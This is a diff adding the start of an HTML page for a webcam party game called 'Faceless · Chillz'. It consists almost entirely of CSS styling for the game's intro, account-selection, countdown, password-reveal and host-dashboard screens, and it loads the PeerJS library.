@@ -1,0 +1,3749 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>🚫 Faceless · Chillz</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js">
+    </script>
+    <style>
+        /* ────────────── RESET & BASE ────────────── */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #07090e;
+            color: #e8edf5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+        }
+        .game-container {
+            max-width: 860px;
+            width: 100%;
+            max-height: 98vh;
+            overflow-y: auto;
+            background: linear-gradient(145deg, #0c111c, #060810);
+            border-radius: 28px;
+            padding: 18px 16px 22px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9), inset 0 1px 2px rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(0, 245, 192, 0.06);
+            position: relative;
+            scrollbar-width: thin;
+        }
+        .game-container::-webkit-scrollbar {
+            width: 3px;
+        }
+        .game-container::-webkit-scrollbar-thumb {
+            background: rgba(0, 245, 192, 0.15);
+            border-radius: 4px;
+        }
+
+        /* ─── OVERLAY SCREENS ─── */
+        .overlay-screen {
+            position: absolute;
+            inset: 0;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 30;
+            background: rgba(6, 8, 16, 0.94);
+            backdrop-filter: blur(14px);
+            border-radius: 22px;
+            padding: 20px;
+            text-align: center;
+        }
+        .overlay-screen.show {
+            display: flex;
+        }
+
+        /* Intro Chillz */
+        #introChillz .chillz-profile {
+            width: 140px;
+            height: 140px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 3px solid #00f5c0;
+            animation: auraGlow 2.2s ease-in-out infinite;
+            box-shadow: 0 0 50px 12px rgba(0, 245, 192, 0.2);
+        }
+        #introChillz .chillz-profile img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        @keyframes auraGlow {
+            0% {
+                box-shadow: 0 0 20px 5px rgba(0, 245, 192, 0.15);
+                border-color: #00f5c0;
+            }
+            50% {
+                box-shadow: 0 0 60px 25px rgba(0, 245, 192, 0.35);
+                border-color: #00d9a0;
+            }
+            100% {
+                box-shadow: 0 0 20px 5px rgba(0, 245, 192, 0.15);
+                border-color: #00f5c0;
+            }
+        }
+        #introChillz h1 {
+            font-size: 1.8rem;
+            margin-top: 14px;
+            color: #00f5c0;
+            text-shadow: 0 0 30px rgba(0, 245, 192, 0.15);
+            font-weight: 700;
+            letter-spacing: 0.05em;
+        }
+        #introChillz .sub {
+            color: rgba(255, 255, 255, 0.2);
+            font-size: 0.9rem;
+            margin-top: 2px;
+            letter-spacing: 0.1em;
+        }
+
+        /* Account Selection */
+        #accountSelection .account-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 14px;
+            max-width: 520px;
+            width: 100%;
+            margin-top: 18px;
+        }
+        .account-item {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1.5px solid rgba(255, 255, 255, 0.05);
+            border-radius: 14px;
+            padding: 12px 8px 10px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            text-align: center;
+            position: relative;
+            backdrop-filter: blur(4px);
+        }
+        .account-item:hover {
+            transform: translateY(-2px);
+            border-color: rgba(0, 245, 192, 0.15);
+            background: rgba(0, 245, 192, 0.03);
+        }
+        .account-item:active {
+            transform: scale(0.97);
+        }
+        .account-item .avatar {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            margin: 0 auto 6px;
+            overflow: hidden;
+            background: #141c2a;
+            border: 2px solid rgba(255, 255, 255, 0.04);
+        }
+        .account-item .avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        .account-item .name {
+            font-size: 0.7rem;
+            color: rgba(255, 255, 255, 0.5);
+            font-weight: 500;
+            letter-spacing: 0.03em;
+        }
+        .account-item .status-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-top: 4px;
+            transition: all 0.3s;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+        }
+        .account-item .status-dot.online {
+            background: #00f5c0;
+            box-shadow: 0 0 12px rgba(0, 245, 192, 0.3);
+            border-color: #00f5c0;
+        }
+        .account-item .status-dot.offline {
+            background: #ff3d3d;
+            box-shadow: 0 0 12px rgba(255, 61, 61, 0.15);
+            border-color: #ff3d3d;
+        }
+        .account-item .status-label {
+            font-size: 0.5rem;
+            color: rgba(255, 255, 255, 0.12);
+            margin-top: 2px;
+            letter-spacing: 0.05em;
+        }
+        .account-item.clickable {
+            border-color: rgba(0, 245, 192, 0.08);
+        }
+        .account-item.clickable:hover {
+            border-color: rgba(0, 245, 192, 0.25);
+        }
+
+        .account-item .error-msg {
+            position: absolute;
+            bottom: -6px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 0.5rem;
+            color: #ff6b6b;
+            background: rgba(255, 0, 0, 0.08);
+            padding: 2px 10px;
+            border-radius: 40px;
+            white-space: nowrap;
+            opacity: 0;
+            transition: opacity 0.3s;
+            border: 1px solid rgba(255, 0, 0, 0.05);
+            pointer-events: none;
+        }
+        .account-item .error-msg.show {
+            opacity: 1;
+        }
+
+        /* Safety Overlay */
+        #safetyOverlay .safety-text {
+            font-size: clamp(2rem, 5vw, 3rem);
+            font-weight: 800;
+            color: #ff3333;
+            text-shadow: 0 0 50px rgba(255, 0, 0, 0.2);
+            text-align: center;
+            padding: 10px;
+            letter-spacing: 0.05em;
+        }
+
+        /* Password Reveal (center overlay) */
+        #passwordReveal {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 8;
+            background: rgba(6, 8, 16, 0.8);
+            backdrop-filter: blur(12px);
+            padding: 16px 24px;
+            border-radius: 16px;
+            border: 1px solid rgba(0, 245, 192, 0.08);
+            text-align: center;
+            pointer-events: none;
+            display: none;
+            min-width: 180px;
+            box-shadow: 0 0 60px rgba(0, 0, 0, 0.5);
+        }
+        #passwordReveal.show {
+            display: block;
+        }
+        #passwordReveal .title {
+            font-size: 0.65rem;
+            color: rgba(255, 255, 255, 0.15);
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+        #passwordReveal .password-chars {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 3px;
+            font-size: clamp(1.2rem, 2.5vw, 1.8rem);
+            font-weight: 700;
+            font-family: 'SF Mono', 'Fira Code', monospace;
+            letter-spacing: 1px;
+        }
+        #passwordReveal .char {
+            width: 26px;
+            text-align: center;
+            color: #00f5c0;
+            border-bottom: 2.5px solid rgba(255, 255, 255, 0.06);
+            padding-bottom: 2px;
+            transition: all 0.4s ease;
+        }
+        #passwordReveal .char.hidden {
+            color: transparent;
+            border-bottom-color: rgba(255, 255, 255, 0.08);
+        }
+        #passwordReveal .char.revealed {
+            color: #ffd93d;
+            border-bottom-color: #ffd93d;
+            text-shadow: 0 0 20px rgba(255, 217, 61, 0.1);
+        }
+        #passwordReveal .char.lost {
+            color: #ff6b6b;
+            border-bottom-color: #ff6b6b;
+            text-shadow: 0 0 20px rgba(255, 107, 107, 0.1);
+        }
+
+        /* Boss Message (player sees) */
+        .boss-message {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: clamp(1.8rem, 4vw, 2.8rem);
+            font-weight: 700;
+            color: #ffd93d;
+            text-shadow: 0 0 50px rgba(255, 217, 61, 0.1);
+            pointer-events: none;
+            z-index: 8;
+            opacity: 0;
+            transition: opacity 0.4s ease;
+            text-align: center;
+            background: rgba(6, 8, 16, 0.7);
+            padding: 14px 28px;
+            border-radius: 16px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 217, 61, 0.06);
+            letter-spacing: 0.05em;
+        }
+        .boss-message.show {
+            opacity: 1;
+        }
+
+        /* ─── HEADER ─── */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 14px;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+        .score-box,
+        .timer-box {
+            background: rgba(255, 255, 255, 0.02);
+            padding: 8px 16px;
+            border-radius: 60px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            font-size: 0.9rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex: 1 1 auto;
+            justify-content: center;
+            backdrop-filter: blur(4px);
+            color: rgba(255, 255, 255, 0.4);
+            letter-spacing: 0.05em;
+        }
+        .score-box span {
+            color: #00f5c0;
+            font-size: 1.3rem;
+            min-width: 30px;
+            text-align: center;
+        }
+        .timer-box span {
+            color: #ff6b6b;
+            font-size: 1.3rem;
+            min-width: 30px;
+            text-align: center;
+            font-variant-numeric: tabular-nums;
+        }
+        .timer-box.warning span {
+            color: #ffd93d;
+        }
+        .timer-box.danger span {
+            color: #ff3d3d;
+            animation: pulse 0.6s ease-in-out infinite alternate;
+        }
+        @keyframes pulse {
+            0% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            100% {
+                opacity: 0.4;
+                transform: scale(0.95);
+            }
+        }
+
+        /* ─── CAMERA WRAPPER ─── */
+        .cam-wrapper {
+            position: relative;
+            border-radius: 20px;
+            overflow: hidden;
+            background: #080b14;
+            border: 1.5px solid rgba(255, 255, 255, 0.03);
+            box-shadow: inset 0 0 60px rgba(0, 0, 0, 0.5);
+            aspect-ratio: 16/11;
+            margin-bottom: 14px;
+        }
+        #webcam {
+            width: 100%;
+            height: 100%;
+            display: block;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+        #recorderVideo {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+        }
+
+        .cam-overlay {
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 12px 14px;
+            z-index: 3;
+        }
+        .challenge-badge {
+            align-self: flex-start;
+            background: rgba(6, 8, 16, 0.75);
+            backdrop-filter: blur(10px);
+            padding: 8px 16px;
+            border-radius: 60px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            font-size: clamp(0.8rem, 1.2vw, 1.1rem);
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s;
+            color: rgba(255, 255, 255, 0.6);
+        }
+        .challenge-badge .highlight {
+            color: #ffd93d;
+        }
+        .challenge-badge .emoji {
+            margin-right: 6px;
+        }
+        .status-badge {
+            align-self: flex-end;
+            background: rgba(6, 8, 16, 0.7);
+            backdrop-filter: blur(8px);
+            padding: 4px 14px;
+            border-radius: 40px;
+            font-size: 0.75rem;
+            font-weight: 500;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            transition: all 0.25s;
+            color: rgba(255, 255, 255, 0.25);
+            letter-spacing: 0.05em;
+        }
+        .status-badge.waiting {
+            color: #8899bb;
+        }
+        .status-badge.scanning {
+            color: #6bcbff;
+            border-color: rgba(107, 203, 255, 0.15);
+        }
+        .status-badge.success {
+            color: #00f5c0;
+            border-color: rgba(0, 245, 192, 0.2);
+            background: rgba(0, 245, 192, 0.06);
+        }
+        .status-badge.fail {
+            color: #ff6b6b;
+            border-color: rgba(255, 107, 107, 0.15);
+            background: rgba(255, 107, 107, 0.04);
+        }
+        .status-badge.loading {
+            color: #ffd93d;
+            border-color: rgba(255, 217, 61, 0.15);
+            background: rgba(255, 217, 61, 0.04);
+        }
+        .status-badge.done {
+            color: #ffd93d;
+            border-color: rgba(255, 217, 61, 0.15);
+            background: rgba(255, 217, 61, 0.04);
+        }
+        .status-badge.hold {
+            color: #ffa94d;
+            border-color: rgba(255, 169, 77, 0.15);
+            background: rgba(255, 169, 77, 0.06);
+            animation: pulseHold 0.8s ease-in-out infinite alternate;
+        }
+        .status-badge.approved {
+            color: #00f5c0;
+            border-color: rgba(0, 245, 192, 0.25);
+            background: rgba(0, 245, 192, 0.08);
+        }
+        .status-badge.rejected {
+            color: #ff6b6b;
+            border-color: rgba(255, 107, 107, 0.2);
+            background: rgba(255, 107, 107, 0.06);
+        }
+        @keyframes pulseHold {
+            0% {
+                opacity: 0.6;
+                transform: scale(1);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1.02);
+            }
+        }
+
+        .points-popup {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.5);
+            font-size: clamp(3rem, 8vw, 5rem);
+            font-weight: 900;
+            pointer-events: none;
+            z-index: 5;
+            opacity: 0;
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            text-shadow: 0 0 60px rgba(255, 255, 255, 0.05);
+        }
+        .points-popup.show {
+            opacity: 1;
+            transform: translate(-50%, -50%) scale(1);
+        }
+        .points-popup.rainbow {
+            background: linear-gradient(90deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #8b00ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-size: 300% 300%;
+            animation: rainbowScroll 1.5s linear infinite, shakeText 0.15s linear infinite;
+        }
+        .points-popup.gold {
+            color: #ffd93d;
+            text-shadow: 0 0 60px rgba(255, 217, 61, 0.15);
+        }
+        .points-popup.white {
+            color: #fff;
+        }
+        @keyframes rainbowScroll {
+            0% {
+                background-position: 0% center;
+            }
+            100% {
+                background-position: 300% center;
+            }
+        }
+        @keyframes shakeText {
+            0% {
+                transform: translate(-50%, -50%) translate(-2px, -1px) rotate(-0.5deg);
+            }
+            25% {
+                transform: translate(-50%, -50%) translate(2px, 1px) rotate(0.5deg);
+            }
+            50% {
+                transform: translate(-50%, -50%) translate(-1px, 2px) rotate(-0.3deg);
+            }
+            75% {
+                transform: translate(-50%, -50%) translate(1px, -2px) rotate(0.3deg);
+            }
+            100% {
+                transform: translate(-50%, -50%) translate(0px, 0px) rotate(0deg);
+            }
+        }
+
+        .countdown-number {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(1.8);
+            font-size: clamp(4rem, 12vw, 7rem);
+            font-weight: 900;
+            color: #fff;
+            text-shadow: 0 0 80px rgba(255, 255, 255, 0.05);
+            pointer-events: none;
+            z-index: 4;
+            opacity: 0;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+        .countdown-number.show {
+            opacity: 1;
+            transform: translate(-50%, -50%) scale(1);
+        }
+        .countdown-number.hide {
+            opacity: 0;
+            transform: translate(-50%, -50%) scale(0.5);
+        }
+
+        .hold-still-msg {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: clamp(1.8rem, 4vw, 2.8rem);
+            font-weight: 800;
+            color: #ffa94d;
+            text-shadow: 0 0 50px rgba(255, 169, 77, 0.1);
+            pointer-events: none;
+            z-index: 6;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            background: rgba(6, 8, 16, 0.5);
+            padding: 10px 24px;
+            border-radius: 12px;
+            backdrop-filter: blur(8px);
+        }
+        .hold-still-msg.show {
+            opacity: 1;
+            animation: pulseHold 0.7s ease-in-out infinite alternate;
+        }
+
+        .player-status-overlay {
+            position: absolute;
+            bottom: 60px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 7;
+            pointer-events: none;
+            background: rgba(6, 8, 16, 0.7);
+            backdrop-filter: blur(10px);
+            padding: 8px 18px;
+            border-radius: 40px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            font-size: 0.75rem;
+            color: rgba(255, 255, 255, 0.2);
+            display: none;
+            text-align: center;
+            min-width: 100px;
+            letter-spacing: 0.05em;
+        }
+        .player-status-overlay.show {
+            display: block;
+        }
+        .player-status-overlay.waiting {
+            color: #8899bb;
+        }
+        .player-status-overlay.approved {
+            color: #00f5c0;
+            border-color: rgba(0, 245, 192, 0.08);
+        }
+        .player-status-overlay.rejected {
+            color: #ff6b6b;
+            border-color: rgba(255, 107, 107, 0.08);
+        }
+
+        .controls {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 6px;
+        }
+        .btn {
+            background: transparent;
+            border: none;
+            padding: 10px 22px;
+            border-radius: 60px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            letter-spacing: 0.4px;
+            cursor: pointer;
+            transition: all 0.25s;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            color: rgba(255, 255, 255, 0.3);
+            min-height: 44px;
+            flex: 1 1 auto;
+            max-width: 200px;
+            -webkit-tap-highlight-color: transparent;
+            backdrop-filter: blur(4px);
+        }
+        .btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.3);
+        }
+        .btn:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .btn:active {
+            transform: scale(0.96);
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #00c9a0, #00a8ff);
+            color: #0b0e14;
+            border-color: transparent;
+            box-shadow: 0 4px 20px rgba(0, 200, 160, 0.15);
+            font-weight: 700;
+        }
+        .btn-primary:hover:not(:disabled) {
+            box-shadow: 0 8px 30px rgba(0, 200, 160, 0.25);
+        }
+        .btn-primary:disabled {
+            background: #1a2a3a;
+            color: #556;
+            box-shadow: none;
+        }
+        .btn-outline {
+            background: rgba(255, 255, 255, 0.02);
+            border-color: rgba(255, 255, 255, 0.05);
+        }
+        .btn-outline:hover:not(:disabled) {
+            background: rgba(255, 255, 255, 0.05);
+        }
+        .btn-flip {
+            background: rgba(255, 255, 255, 0.02);
+            border-color: rgba(255, 255, 255, 0.04);
+            color: rgba(255, 255, 255, 0.15);
+            min-width: 46px;
+            flex: 0 0 auto;
+            padding: 10px 14px;
+            font-size: 1.1rem;
+        }
+        .btn-flip:hover:not(:disabled) {
+            background: rgba(255, 255, 255, 0.05);
+            color: rgba(255, 255, 255, 0.4);
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2.5px solid rgba(255, 255, 255, 0.08);
+            border-top-color: #00f5c0;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .btn .spinner {
+            width: 16px;
+            height: 16px;
+            border-width: 2.5px;
+        }
+        .hidden {
+            display: none !important;
+        }
+
+        .status-msg {
+            margin-top: 8px;
+            text-align: center;
+            font-size: 0.8rem;
+            color: rgba(255, 255, 255, 0.1);
+            padding: 0 6px;
+            min-height: 20px;
+            letter-spacing: 0.05em;
+        }
+        .status-msg.error {
+            color: #ff6b6b;
+        }
+        .status-msg.success {
+            color: #00f5c0;
+        }
+        .status-msg.loading {
+            color: #ffd93d;
+        }
+
+        .loading-container {
+            width: 100%;
+            max-width: 280px;
+            margin: 8px auto;
+        }
+        .loading-track {
+            width: 100%;
+            height: 3px;
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        .loading-fill {
+            height: 100%;
+            width: 0%;
+            border-radius: 4px;
+            background: linear-gradient(90deg, #00f5c0, #00a8ff);
+            transition: width 0.3s ease;
+        }
+        .loading-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.6rem;
+            color: rgba(255, 255, 255, 0.08);
+            margin-top: 4px;
+            letter-spacing: 0.05em;
+        }
+        .loading-label .pct {
+            color: rgba(255, 255, 255, 0.15);
+            font-weight: 600;
+        }
+
+        /* ─── INTRO SCREEN (voice only) ─── */
+        #introScreen {
+            position: absolute;
+            inset: 0;
+            background: rgba(6, 8, 16, 0.92);
+            backdrop-filter: blur(14px);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 20;
+            border-radius: 22px;
+            padding: 30px;
+        }
+        #introScreen .intro-box {
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        #introScreen .intro-box h1 {
+            font-size: clamp(2rem, 5vw, 2.8rem);
+            font-weight: 800;
+            background: linear-gradient(135deg, #00f5c0, #00a8ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 4px;
+            letter-spacing: 0.02em;
+        }
+        #introScreen .intro-box .sub {
+            color: rgba(255, 255, 255, 0.15);
+            font-size: 0.85rem;
+            margin-bottom: 6px;
+            letter-spacing: 0.05em;
+        }
+        #introScreen .intro-box .voice-prompt {
+            color: rgba(255, 255, 255, 0.2);
+            font-size: 0.95rem;
+            margin: 4px 0;
+            letter-spacing: 0.05em;
+        }
+        #introScreen .intro-box .voice-prompt .highlight-begin {
+            color: #00f5c0;
+            font-weight: 600;
+        }
+        #introScreen .intro-box .voice-status {
+            margin-top: 6px;
+            font-size: 0.75rem;
+            color: rgba(255, 255, 255, 0.08);
+            min-height: 18px;
+            transition: color 0.3s;
+            letter-spacing: 0.05em;
+        }
+        #introScreen .intro-box .voice-status.detected {
+            color: #00f5c0;
+        }
+        #introScreen .intro-box .voice-status.error {
+            color: #ff6b6b;
+        }
+        #introScreen .intro-box .host-badge {
+            display: none;
+            margin-top: 10px;
+            font-size: 0.6rem;
+            color: #ffd93d;
+            letter-spacing: 0.05em;
+            border: 1px solid rgba(255, 217, 61, 0.08);
+            padding: 3px 14px;
+            border-radius: 40px;
+            background: rgba(255, 217, 61, 0.03);
+        }
+        #introScreen .intro-box .host-badge.show {
+            display: inline-block;
+        }
+
+        /* ─── PLAYER DISCLAIMER ─── */
+        #playerDisclaimer {
+            position: absolute;
+            inset: 0;
+            background: rgba(6, 8, 16, 0.92);
+            backdrop-filter: blur(14px);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 25;
+            border-radius: 22px;
+            padding: 24px;
+        }
+        #playerDisclaimer.show {
+            display: flex;
+        }
+        #playerDisclaimer .disclaimer-box {
+            text-align: center;
+            max-width: 420px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 18px;
+            padding: 26px 22px;
+        }
+        #playerDisclaimer .disclaimer-box h2 {
+            font-size: 1.4rem;
+            margin-bottom: 10px;
+            color: #e8edf5;
+            font-weight: 600;
+            letter-spacing: 0.02em;
+        }
+        #playerDisclaimer .disclaimer-box p {
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 0.85rem;
+            line-height: 1.6;
+            margin-bottom: 14px;
+        }
+        #playerDisclaimer .disclaimer-box .countdown-area {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin: 12px 0 8px;
+        }
+        #playerDisclaimer .disclaimer-box .countdown-area .countdown-number-display {
+            font-size: 2rem;
+            font-weight: 800;
+            color: #00f5c0;
+            font-family: 'SF Mono', monospace;
+            min-width: 50px;
+        }
+        #playerDisclaimer .disclaimer-box .countdown-area .countdown-label {
+            color: rgba(255, 255, 255, 0.2);
+            font-size: 0.9rem;
+        }
+        #playerDisclaimer .disclaimer-box .btn-continue {
+            background: linear-gradient(135deg, #00f5c0, #00a8ff);
+            color: #0b0e14;
+            border: none;
+            padding: 10px 36px;
+            border-radius: 60px;
+            font-size: 0.95rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            opacity: 0.2;
+            pointer-events: none;
+            width: 100%;
+            max-width: 180px;
+            margin: 0 auto;
+        }
+        #playerDisclaimer .disclaimer-box .btn-continue.enabled {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        #playerDisclaimer .disclaimer-box .btn-continue.enabled:hover {
+            transform: scale(1.03);
+            box-shadow: 0 0 40px rgba(0, 245, 192, 0.1);
+        }
+        #playerDisclaimer .disclaimer-box .btn-continue.enabled:active {
+            transform: scale(0.96);
+        }
+
+        /* ─── HOST DASHBOARD ─── */
+        #hostDashboard {
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(ellipse at 30% 20%, #0a1220, #060810);
+            display: none;
+            flex-direction: column;
+            border-radius: 22px;
+            padding: 12px 14px 16px;
+            z-index: 21;
+            border: 1px solid rgba(0, 245, 192, 0.04);
+            box-shadow: inset 0 0 80px rgba(0, 245, 192, 0.01);
+            overflow: hidden;
+        }
+        #hostDashboard.show {
+            display: flex;
+        }
+        .host-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin-bottom: 8px;
+            padding-bottom: 6px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            flex-shrink: 0;
+        }
+        .host-header .host-title {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .host-header .host-title .crown {
+            font-size: 1.1rem;
+        }
+        .host-header .host-title h2 {
+            font-size: 1rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #ffd93d, #ff6b6b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 0.02em;
+        }
+        .host-header .host-status {
+            font-size: 0.55rem;
+            color: rgba(255, 255, 255, 0.12);
+            letter-spacing: 0.05em;
+            background: rgba(255, 255, 255, 0.02);
+            padding: 2px 12px;
+            border-radius: 40px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .host-header .host-status .dot {
+            display: inline-block;
+            width: 5px;
+            height: 5px;
+            border-radius: 50%;
+        }
+        .host-header .host-status .dot.online {
+            background: #00f5c0;
+            animation: pulseHold 0.8s ease-in-out infinite alternate;
+        }
+        .host-header .host-status .dot.offline {
+            background: #556;
+        }
+
+        .host-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            flex: 1;
+            min-height: 0;
+        }
+        @media (max-width: 700px) {
+            .host-grid {
+                grid-template-columns: 1fr;
+                gap: 6px;
+            }
+        }
+
+        .host-left {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            overflow: hidden;
+            min-height: 0;
+        }
+
+        .host-part-selector {
+            background: rgba(255, 255, 255, 0.01);
+            border-radius: 10px;
+            padding: 6px 8px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            flex: 1;
+            min-height: 0;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .host-part-selector .selector-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 3px;
+            flex-shrink: 0;
+        }
+        .host-part-selector .selector-header .title {
+            font-size: 0.55rem;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.15);
+            letter-spacing: 0.05em;
+        }
+        .host-part-selector .selector-header .current-part-label {
+            font-size: 0.5rem;
+            color: #ffd93d;
+            background: rgba(255, 217, 61, 0.04);
+            padding: 1px 10px;
+            border-radius: 40px;
+            border: 1px solid rgba(255, 217, 61, 0.04);
+            max-width: 100px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .host-part-selector .part-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 2px;
+            overflow-y: auto;
+            padding: 3px 0;
+            flex: 1;
+            align-content: flex-start;
+            min-height: 50px;
+            max-height: 160px;
+        }
+        @media (min-height: 700px) {
+            .host-part-selector .part-list {
+                max-height: 210px;
+            }
+        }
+        @media (max-height: 600px) {
+            .host-part-selector .part-list {
+                max-height: 90px;
+            }
+        }
+        .host-part-selector .part-list::-webkit-scrollbar {
+            width: 2px;
+        }
+        .host-part-selector .part-list::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 4px;
+        }
+        .host-part-selector .part-item {
+            display: flex;
+            align-items: center;
+            gap: 3px;
+            padding: 3px 8px;
+            border-radius: 40px;
+            font-size: 0.5rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            background: rgba(255, 255, 255, 0.01);
+            -webkit-tap-highlight-color: transparent;
+            white-space: nowrap;
+            flex-shrink: 0;
+            min-height: 22px;
+            color: rgba(255, 255, 255, 0.2);
+        }
+        .host-part-selector .part-item:hover {
+            transform: scale(1.04);
+            border-color: rgba(0, 245, 192, 0.08);
+            background: rgba(0, 245, 192, 0.02);
+            color: rgba(255, 255, 255, 0.4);
+        }
+        .host-part-selector .part-item:active {
+            transform: scale(0.95);
+        }
+        .host-part-selector .part-item .dot-color {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            display: inline-block;
+            flex-shrink: 0;
+        }
+        .host-part-selector .part-item .dot-color.green {
+            background: #00f5c0;
+            box-shadow: 0 0 8px rgba(0, 245, 192, 0.1);
+        }
+        .host-part-selector .part-item .dot-color.yellow {
+            background: #ffd93d;
+            box-shadow: 0 0 8px rgba(255, 217, 61, 0.1);
+        }
+        .host-part-selector .part-item .dot-color.orange {
+            background: #ff9100;
+            box-shadow: 0 0 8px rgba(255, 145, 0, 0.1);
+        }
+        .host-part-selector .part-item .dot-color.red {
+            background: #ff3d3d;
+            box-shadow: 0 0 8px rgba(255, 61, 61, 0.1);
+        }
+        .host-part-selector .part-item .part-name {
+            font-weight: 500;
+        }
+        .host-part-selector .part-item .part-points {
+            font-size: 0.4rem;
+            color: rgba(255, 255, 255, 0.08);
+        }
+        .host-part-selector .part-item.active {
+            border-color: rgba(0, 245, 192, 0.15);
